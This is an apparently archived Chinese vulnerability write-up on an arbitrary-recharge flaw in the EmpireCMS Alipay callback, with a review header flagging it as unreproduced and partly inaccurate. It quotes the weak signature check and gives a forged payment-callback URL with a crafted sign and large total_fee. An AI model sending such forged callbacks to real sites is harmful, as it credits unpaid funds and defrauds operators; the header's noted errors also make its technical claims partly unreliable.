---
source: "hatch 补库批 20260928"
product: "EmpireCMS Alipay module"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "EmpireCMS 任意充值漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：会员登录并建立订单及Cookie；支付key未配置/为0的特定状态"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-75c950bc12a662f92122049e"
entity_id: "ve-75c950bc12a662f92122049e"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：会员登录并建立订单及Cookie；支付key未配置/为0的特定状态

- **适用与权限边界（1）**：缺版本；核心条件是可预测/缺失密钥和签名逻辑，不应以未检测来自支付宝链接作为安全修复方向。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **结论使用边界（2）**：给定sign非标准32位MD5长度，声称GET数组MD5但代码实际按遍历顺序拼接并追加paykey，解释不准确。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（3）**：代码包含print($sign)可能本身泄露签名，应核对是否调试插入；结果仅7.png8.png。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# EmpireCMS 任意充值漏洞

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

漏洞文件

> https://www.0-sec.org/EmpireCMS/upload/e/payapi/alipay/payend.php

漏洞详情

首先在`/e/payapi/alipay/payend.php`

    $sign='';

    foreach($_GET AS $key=>$val)

    {

    if($key!='sign'&&$key!='sign_type'&&$key!='code')

    {

    $sign.="$key=$val&";

    }

    }



    $sign=md5(substr($sign,0,-1).$paykey);

    print($sign);

    if($sign!=$_GET['sign'])

    {

    printerror('验证MD5签名失败.','../../../',1,0,1);

这个是sign签名的验证没有检测来源是否为支付宝链接而且没有安装情况下key为0

所以我们可以自己构造sign

    https://www.0-sec.org/EmpireCMS/upload/e/payapi/alipay/payend.php?sign=63b90f066d744a4d53150045837bd90d&trade_status=TRADE_FINISHED&trade_no=1111&out_trade_no=aaaaaa&total_fee=11111111

`sign=63b90f066d744a4d53150045837bd90d`是get的数组的md5值

当然需要登录情况下还要自己手动在用户中心提交次订单，系统会设置cookie满足条件然后在到我们sign的地方

提交后7.png8.png

参考链接
--------

> https://man-hin.lofter.com/post/37bd50\_1c886dc36
